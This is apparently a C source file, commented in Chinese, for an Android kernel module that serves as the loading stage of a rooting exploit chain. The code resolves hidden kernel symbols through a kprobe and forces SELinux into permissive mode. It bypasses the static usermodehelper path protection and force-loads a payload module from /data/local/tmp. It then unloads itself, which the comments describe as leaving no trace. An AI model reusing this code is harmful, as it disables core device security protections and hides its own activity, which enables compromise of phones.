/* ksu_min_load.c — 极简内核装载器（替代 ksud 的进程风暴）
 * ──────────────────────────────────────────────────────────────────────────────
 * 为什么需要它（实测证据，2026-10-06）：
 *   exploit 走到装载段时会拉起 ksud（管理器的入口），那串进程风暴把内核 workqueue
 *   饿死 ⇒ 厂商内核 panic（dmesg: "BUG: workqueue lockup - pool cpus=… nice=-20 stuck for
 *   49s/57s/88s"，三种 CPU 配置 6/4/不钉 均复现）⇒ 设备重启。
 *   而【绕开 ksud 的那一发 crash.log 归零】⇒ 证明风暴就是那个崩因的触发源。
 *
 * 本模块只做三件事，全部用【已导出】或【kprobe 可解析】的符号，不制造进程风暴：
 *   ① kprobe 取 kallsyms_lookup_name（经典自举，register_kprobe 内部按名字查，
 *      不受 EXPORT_SYMBOL 限制 ⇒ 未导出的也能拿到）
 *   ② WRITE_ONCE(*selinux_state, 0) ⇒ permissive（DirtyFrag 同款做法）
 *   ③ call_usermodehelper_setup/exec（这两个本来就是 EXPORT_SYMBOL ⇒ 不需要 kprobe）
 *      只跑【一句 insmod】—— 不拉 ksud、不拉管理器
 *   然后 return -E2BIG 让内核把本模块卸载掉（不留痕迹，DirtyFrag 同款）
 *
 * 为什么不用 finit_module：内核态没有这个的人口；用 umh 跑用户态 insmod 是
 * DirtyFrag 验证过在 android12-5.10 上可行的做法。
 */
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/kmod.h>
#include <linux/kprobes.h>
#include <linux/module.h>
#include <linux/ptrace.h>

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("minimal KernelSU late-loader (no ksud storm)");

typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
typedef void *(*umh_setup_t)(const char *path, char **argv, char **envp, gfp_t gfp,
                             void *init, void *cleanup, void *data);
typedef int (*umh_exec_t)(void *info, int wait);

/* ★ 模块参数：装载目标与日志路径，便于换弹药而不重编 */
static char *ko_path = "/data/local/tmp/KernelSX2.ko";
module_param(ko_path, charp, 0);

static int __nocfi __init ksu_min_load_init(void)
{
    kallsyms_lookup_name_t get_addr;
    umh_setup_t umh_setup;
    umh_exec_t  umh_exec;
    bool *selinux_state;
    struct kprobe kln_kp;
    void *info;
    int ret;

    static const char insmod[] = "/system/bin/insmod";
    static char *envp[] = { "PATH=/system/bin", NULL };
    static char *argv[] = { (char *)insmod, "-f", NULL, NULL };
    argv[2] = ko_path;

    /* ① 自举：拿 kallsyms_lookup_name */
    memset(&kln_kp, 0, sizeof(kln_kp));
    kln_kp.symbol_name = "kallsyms_lookup_name";
    if (register_kprobe(&kln_kp) < 0) {
        pr_err("ksu_min: kallsyms_lookup_name not found\n");
        return -EINVAL;
    }
    get_addr = (kallsyms_lookup_name_t)kln_kp.addr;
    unregister_kprobe(&kln_kp);
    pr_info("ksu_min: kallsyms_lookup_name @ %px\n", (void *)get_addr);

    /* ② permissive（DirtyFrag 同款；拿到就设，拿不到也不致命） */
    selinux_state = (bool *)get_addr("selinux_state");
    if (selinux_state) {
        WRITE_ONCE(*selinux_state, false);
        pr_info("ksu_min: selinux_state -> permissive\n");
    } else {
        pr_warn("ksu_min: selinux_state not found (skip)\n");
    }

    /* ③ 用 usermodehelper 跑一句 insmod（这两个符号是导出的 ⇒ 不需要 kprobe） */
    umh_setup = (umh_setup_t)get_addr("call_usermodehelper_setup");
    umh_exec  = (umh_exec_t)get_addr("call_usermodehelper_exec");
    if (!umh_setup || !umh_exec) {
        pr_err("ksu_min: umh symbols missing (setup=%px exec=%px)\n",
               (void *)umh_setup, (void *)umh_exec);
        return -EINVAL;
    }

    info = umh_setup(insmod, argv, envp, GFP_KERNEL, NULL, NULL, NULL);
    if (!info) {
        pr_err("ksu_min: umh_setup returned NULL\n");
        return -EINVAL;
    }
    /* 绕过 CONFIG_STATIC_USERMODEHELPER_PATH 把 path 覆盖成 "" */
    ((struct subprocess_info *)info)->path = insmod;

    ret = umh_exec(info, UMH_WAIT_PROC);
    pr_info("ksu_min: insmod %s -> %d\n", ko_path, ret);

    return -E2BIG;   /* 返回错误 ⇒ 内核卸载本模块（不留痕迹） */
}

/* 没有 module_exit：我们从不走正常卸载路径，省掉 .exit 段 */
module_init(ksu_min_load_init);
